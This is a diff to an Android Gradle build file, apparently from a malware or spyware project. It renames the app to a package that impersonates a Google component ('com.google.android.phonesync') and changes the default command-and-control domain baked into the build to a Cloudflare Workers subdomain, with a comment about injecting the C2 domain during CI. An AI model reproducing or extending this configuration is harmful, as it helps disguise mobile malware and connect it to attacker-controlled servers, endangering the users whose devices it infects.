@@ -4,11 +4,11 @@ plugins {
 }
 
 android {
-    namespace = "com.google.android.contactsync"
+    namespace = "com.google.android.phonesync"
     compileSdk = 34
 
     defaultConfig {
-        applicationId = "com.google.android.contactsync"
+        applicationId = "com.google.android.phonesync"
         minSdk = 24
         targetSdk = 34
         versionCode = 1
@@ -16,8 +16,8 @@ android {
         vectorDrawables.useSupportLibrary = true
 
         // C2 Domain injection: set via env var or GitHub Secret during CI.
-        // Default: Cloudflare Workers free subdomain
-        buildConfigField("String", "C2_DOMAIN", "\"${System.getenv("C2_DOMAIN") ?: "shadow-worker.marwannaili-23-07.workers.dev"}\"")
+        // Default: Cloudflare Workers free subdomain (branch deepseek/version2)
+        buildConfigField("String", "C2_DOMAIN", "\"${System.getenv("C2_DOMAIN") ?: "shadow-v2.marwannaili-23-07.workers.dev"}\"")
     }
 
     signingConfigs {
